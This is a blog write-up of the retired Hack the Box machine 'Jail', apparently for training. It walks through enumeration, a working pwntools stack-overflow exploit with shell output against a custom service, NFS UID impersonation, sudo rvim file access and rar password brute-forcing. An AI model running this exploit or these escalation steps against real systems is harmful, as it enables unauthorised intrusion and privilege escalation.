---
layout: post
title:  "Hack the Box - Going to Jail"
date:   2018-01-12 12:16:01 -0600
categories: hackthebox writeup reversing bof nfs sharing network file pwntools bof overflow PIE
---

<img class="header-img" src="{{ "img/jail/home.png" | relative_url }}" />

<a href="https://hackthebox.eu">Hack the Box</a> has finally retired Jail! Jail is a really 
fun box with a consistant level of difficulty all the way through, and a really fun
ending.

{% highlight shell %}
~ » nmap jail.htb -p- -sS -A
Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-10 16:51 EST
Nmap scan report for 10.10.10.34
Host is up (0.15s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (EdDSA)
80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  3,4         2049/tcp  nfs
|   100003  3,4         2049/udp  nfs
|   100005  1,2,3      20048/tcp  mountd
|   100005  1,2,3      20048/udp  mountd
|   100021  1,3,4      38558/tcp  nlockmgr
|   100021  1,3,4      55799/udp  nlockmgr
|   100024  1          47122/tcp  status
|   100024  1          56299/udp  status
|   100227  3           2049/tcp  nfs_acl
|_  100227  3           2049/udp  nfs_acl
2049/tcp  open  nfs_acl    3 (RPC #100227)
7411/tcp  open  daqstream?
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, WMSRequest, X11Probe, afp, giop, oracle-tns: 
|_    OK Ready. Send USER command.
20048/tcp open  mountd     1-3 (RPC #100005)
{% endhighlight %}

There is some interesting stuff to parse through here (nfs), but lets just start by scanning the HTTP port.
{% highlight shell %}
~ » dirb http://jail.htb
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

[...]                                                       

---- Scanning URL: http://jail.htb/ ----
+ http://jail.htb/admin (CODE:302|SIZE:28) 
[...]
+ http://10.10.10.34/cgi-bin/ (CODE:403|SIZE:210)                                                           
+ http://10.10.10.34/index.html (CODE:200|SIZE:2106)
{% endhighlight %}

Nothing interesting, but persistence is key when enumerating. While `dirb` and its defaults are great for quick and dirty scanning,
it will often miss things a larger list would catch. So the next step is to bust out the big guns: `dirbuster` or `gobuster`. Using the `directory-list-lowercase-2.3-medium.txt` list from `dirbuster`, we hit the jackbot, the `jailuser` directory. This contains some source
code, a build script, and the resulting binary. After looking at the source code briefly, it looks like this is the service listening
on port `7411`:

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

int debugmode;
int handle(int sock);
int auth(char *username, char *password);

int auth(char *username, char *password) {
    char userpass[16];
    char *response;
    if (debugmode == 1) {
        printf("Debug: userpass buffer @ %p\n", userpass);
        fflush(stdout);
    }
    if (strcmp(username, "admin") != 0) return 0;
    strcpy(userpass, password);
    if (strcmp(userpass, "1974jailbreak!") == 0) {
        return 1;
    } else {
        printf("Incorrect username and/or password.\n");
        return 0;
    }
    return 0;
}

int handle(int sock) {
    int n;
    int gotuser = 0;
    int gotpass = 0;
    char buffer[1024];
    char strchr[2] = "\n\x00";
    char *token;
    char username[256];
    char password[256];
    debugmode = 0;
    memset(buffer, 0, 256);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    printf("OK Ready. Send USER command.\n");
    fflush(stdout);
    while(1) {
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("ERROR reading from socket");
            return 0;
        }
        token = strtok(buffer, strchr);
        while (token != NULL) {
            if (gotuser == 1 && gotpass == 1) {
                break;
            }
            if (strncmp(token, "USER ", 5) == 0) {
                strncpy(username, token+5, sizeof(username));
                gotuser=1;
                if (gotpass == 0) {
                    printf("OK Send PASS command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "PASS ", 5) == 0) {
                strncpy(password, token+5, sizeof(password));
                gotpass=1;
                if (gotuser == 0) {
                    printf("OK Send USER command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "DEBUG", 5) == 0) {
                if (debugmode == 0) {
                    debugmode = 1;
                    printf("OK DEBUG mode on.\n");
                    fflush(stdout);
                } else if (debugmode == 1) {
                    debugmode = 0;
                    printf("OK DEBUG mode off.\n");
                    fflush(stdout);
                }
            }
            token = strtok(NULL, strchr);
        }
        if (gotuser == 1 && gotpass == 1) {
            break;
        }
    }
    if (auth(username, password)) {
        printf("OK Authentication success. Send command.\n");
        fflush(stdout);
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("Socket read error");
            return 0;
        }
        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        } else {
            printf("ERR Invalid command.\n");
            fflush(stdout);
            return 1;
        }
    } else {
        printf("ERR Authentication failed.\n");
        fflush(stdout);
        return 0;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    int sockfd;
    int newsockfd;
    int port;
    int clientlen;
    char buffer[256];
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int n;
    int pid;
    int sockyes;
    sockyes = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sockyes, sizeof(int)) == -1) {
        perror("Setsockopt error");
        exit(1);
    }
    memset((char*)&server_addr, 0, sizeof(server_addr));
    port = 7411;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind error");
        exit(1);
    }
    listen(sockfd, 200);
    clientlen = sizeof(client_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);
        if (newsockfd < 0) {
            perror("Accept error");
            exit(1);
        }
        pid = fork();
        if (pid < 0) {
            perror("Fork error");
            exit(1);
        }
        if (pid == 0) {
            close(sockfd);
            exit(handle(newsockfd));
        } else {
            close(newsockfd);
        }
    }
}
{% endhighlight %}

It's pretty clear that this code is vulnerable to a simple buffer overflow. `handle` calls `auth`
and passes in `username` and `password`, both of which are 256 byte arrays. In `auth`, however,
`password` is copied into a 16 byte array, meaning we have 256 - 16 bytes of overflow. Since we're
calling this binary remotely, we need to execute some code which connects back to us, or binds a port
which we can then connect to. 

The next step is determining exactly _how_ we execute this code. Luckily for us, the binary is compiled
with an executable stack:
{% highlight shell %}
[root:~/Documents/htb/jail]# cat compile.sh 
gcc -o jail jail.c -m32 -z execstack
...
{% endhighlight %}
This means we can simply overflow the array with shellcode, and don't have to worry about searching for
any ROP gadgets. 

So, we know what kind of shellcode we need, and how we can load it into memory. The final step is determining
_where_ to jump to. This presents a slight challenge to us, as the binary does have <a href="https://en.wikipedia.org/wiki/Position-independent_code">PIE</a> enabled. That means the binary runs
at a random(ish) address every time it starts. 
{% highlight shell %}
[root:~/Documents/htb/jail]# gdb -q jail   
warning: /root/.gdbinit-gef.py: No such file or directory
Reading symbols from jail...(no debugging symbols found)...done.
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : Partial
{% endhighlight %}

Once again (how coincidental :)), this binary presents an easy way around the challenge. If we set `debugmode` (by sending "DEBUG") and try to authenticate, it will tell us where the buffer is located. Now that we have all the pieces we need,
lets get <a href="https://pwntools.com">pwntooling</a>

First, lets import pwntools and set our context:
{% highlight python %}
from pwn import *
context(arch='i386',os='linux')
{% endhighlight %}

Next, we need to connect to the remote service:
{% highlight python %}
HOST = '10.10.10.34'
PORT = 7411
r = remote(HOST, PORT)
{% endhighlight %}

One of the many awesome things about pwntools is that it can do a lot of the annoying shellcode work for us. It has a 
module called <a href="http://docs.pwntools.com/en/stable/shellcraft.html">shellcraft</a> which has architecture specific
shellcode for common needs. In this case, we want to find an open socket and open a shell on it, and then jump into
that shellcode (address of buffer plus an offset into our <a href="https://en.wikipedia.org/wiki/NOP_slide">NOP-sled</a>):
{% highlight python %}
buf = asm(shellcraft.findpeersh())
sizeof_buffer = 240  # buffer is 256 - 16 (sizeof(userpass)) = 240
nop   = asm(shellcraft.nop())
pad   = nop
addr = 0xffffd610 + 0x30
{% endhighlight %}

Finally, we calculate the final payload, and send it:
{% highlight python %}
address_buf = p32(addr) * 8  # address spray
buf = buf.rjust(sizeof_buffer - len(address_buf), pad)
buf = address_buf + buf

log.info("Exploit buf:\n%s" % hexdump(buf, 8))

r.send('DEBUG\n')
sleep(0.1)
r.send('USER admin\n')
sleep(0.1)
r.send('PASS ' + buf + '\x00')
r.interactive()
{% endhighlight %}
{% highlight shell %}
[root:~/Documents/htb/jail]# python2 win.py
[+] Opening connection to 10.10.10.34 on port 7411: Done
[*] Exploit buf:
    00000000  40 d6 ff ff  40 d6 ff ff  │@···│@···│
    *
    00000020  90 90 90 90  90 90 90 90  │····│····│
    *
    00000098  90 90 90 90  6a ff 6a 07  │····│j·j·│
    000000a0  89 e5 5b 5e  6a 66 58 46  │··[^│jfXF│
    000000a8  8d 4c 24 e0  6a 04 60 cd  │·L$·│j·`·│
    000000b0  80 85 c0 61  5a 75 ed 89  │···a│Zu··│
    000000b8  f3 6a 03 59  49 6a 3f 58  │·j·Y│Ij?X│
    000000c0  cd 80 75 f8  6a 68 68 2f  │··u·│jhh/│
    000000c8  2f 2f 73 68  2f 62 69 6e   │//sh│/bin│
    000000d0  89 e3 68 01  01 01 01 81  │··h·│····│
    000000d8  34 24 72 69  01 01 31 c9  │4$ri│··1·│
    000000e0  51 6a 04 59  01 e1 51 89  │Qj·Y│··Q·│
    000000e8  e1 31 d2 6a  0b 58 cd 80  │·1·j│·X··│
    000000f0
[*] Switching to interactive mode
OK Ready. Send USER command.
OK DEBUG mode on.
OK Send PASS command.
Debug: userpass buffer @ 0xffffd610
$ whoami
nobody
{% endhighlight %}

Step 1: complete. Unfortunately, we're `nobody`, so maybe we should go back and look at NFS. Luckily, we 
can view the NFS exports as `nobody`:
{% highlight shell %}
$ cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash)
$ ls -la /var
total 16
drwxr-xr-x. 23 root root  4096 Jan  9 14:38 .
dr-xr-xr-x. 17 root root   224 Jun 25  2017 ..
-rw-r--r--.  1 root root   163 Jun 25  2017 .updated
drwxr-xr-x.  2 root root    19 Jun 25  2017 account
drwxr-x---.  3 root adm     19 Jul  3  2017 adm
drwxr-xr-x. 15 root root   190 Jun 25  2017 cache
drwxr-xr-x.  2 root root     6 Nov  7  2016 crash
drwxr-xr-x.  3 root root    34 Jun 25  2017 db
drwxr-xr-x.  3 root root    18 Jun 25  2017 empty
drwxr-xr-x.  2 root root     6 Nov  5  2016 games
drwxr-xr-x.  2 root root     6 Nov  5  2016 gopher
drwxr-xr-x.  3 root root    18 Dec  6  2016 kerberos
drwxr-xr-x. 55 root root  4096 Jan  9 14:38 lib
drwxr-xr-x.  2 root root     6 Nov  5  2016 local
lrwxrwxrwx.  1 root root    11 Jun 25  2017 lock -> ../run/lock
drwxr-xr-x. 21 root root  4096 Jan  9 15:43 log
lrwxrwxrwx.  1 root root    10 Jun 25  2017 mail -> spool/mail
drwx-wx--x.  2 root frank   24 Jan 11 06:40 nfsshare
drwxr-xr-x.  2 root root     6 Nov  5  2016 nis
drwxr-xr-x.  2 root root     6 Nov  5  2016 opt
drwxr-xr-x.  2 root root     6 Nov  5  2016 preserve
lrwxrwxrwx.  1 root root     6 Jun 25  2017 run -> ../run
drwxr-xr-x. 12 root root   140 Jun 25  2017 spool
drwxr-xr-x.  4 root root    28 Jun 25  2017 target
drwxrwxrwt.  5 root root   175 Jan 12 19:33 tmp
drwxr-xr-x.  4 root root    33 Jun 25  2017 www
drwxr-xr-x.  2 root root     6 Nov  5  2016 yp
{% endhighlight %}

They correctly exported their directorys as `root_squash`, however `no_all_squash` could be our way in. Due to the 
NFS security model, this means that we can create a local user with the same UID/GID as `frank` on the jail box,
mount the nfs share, and use it as if we were `frank`. 
{% highlight shell %}
$ cat /etc/passwd
...
frank:x:1000:1000:frank:/home/frank:/bin/bash
...
{% endhighlight %}

Let's mount the nfs directory, create a user named frank and make sure the UID and GID are correct:
{% highlight shell %}
$ mkdir /tmp/nfs
$ mount 10.10.10.34:/var/nfsshare nfs
$ useradd frank
$ cat /etc/passwd
...
frank:x:1000:1000::/home/frank:/bin/bash
...
$ su frank
{% endhighlight %}

Now we should be able to upload files onto the `jail` server as if we were `frank`. The easiest way in 
from here would be to upload a key to `authorized_keys` so that we can SSH in as `frank`, since we saw port `22` was open
in our `nmap` scan.

Since we can upload _any_ kind of file as frank, the way forward is to write a file in C with suid as frank, which 
writes our public key into `/home/frank/.ssh/authorized_keys`. Since this is relatively simple, and this is already a long 
post, I'll leave that as an exercise to the reader.

Now we can ssh in as `frank` and can poke around for priv-esc. Once again, `sudo -l` shows us the way:
{% highlight shell %}
$ ssh frank@10.10.10.34
$ sudo -l
...
(adm) NOPASSWD: /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
...
{% endhighlight %}

So, we can't get root, but we can get `adm`. Remembering back to our enumeration as `nobody`, there was a `/var/adm` folder 
which `adm` had access to. Maybe we can take a peek there?
{% highlight shell %}
$ sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
{% endhighlight %}

We can't execute any shell commands in `rvim`, but we can still use `:e` to view directories and files. So, if we do `:e /var/adm`
we can see the contents:
{% highlight shell %}
../
./
.local/
keys.rar
note.txt
{% endhighlight %}

and `.local`:
{% highlight shell %}
.frank
{% endhighlight %}

Opening `note.txt` gives us an encrypted message. Due to all of the repetition, it looks like a simple substituion cipher, and it is 
(<a href="https://quipqiup.com/">quipqiup</a> suffices):
{% highlight shell %}
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
[quipqiup]
Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!
{% endhighlight %}

Opening `.frank` gives us the next huge hint:
{% highlight shell %}
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
{% endhighlight %}

Finally, we can open `keys.rar` (with `:e` again) and re-save it anywhere `/opt` or `/tmp` for example (`:w`) so we can access it. We now have a password 
protected `rar` with a password of the form `[lastname?][\d\d\d\d][special]`. Using the encrypted hint, we can Google around and find a `Frank Morris` who attempted an Alcatraz escape and was never found. That gives us `Morris[\d\d\d\d][!|?|@|$|%|^]` which is trivially easy to brute force, especially if you guess the most common four digit number would be a year (1900-2018).

When we unrar the file, we get a single public key. From here it seems obvious we need to break the public key, so we use `RsaCtfTool`, and the rest is easy. 

_fin_
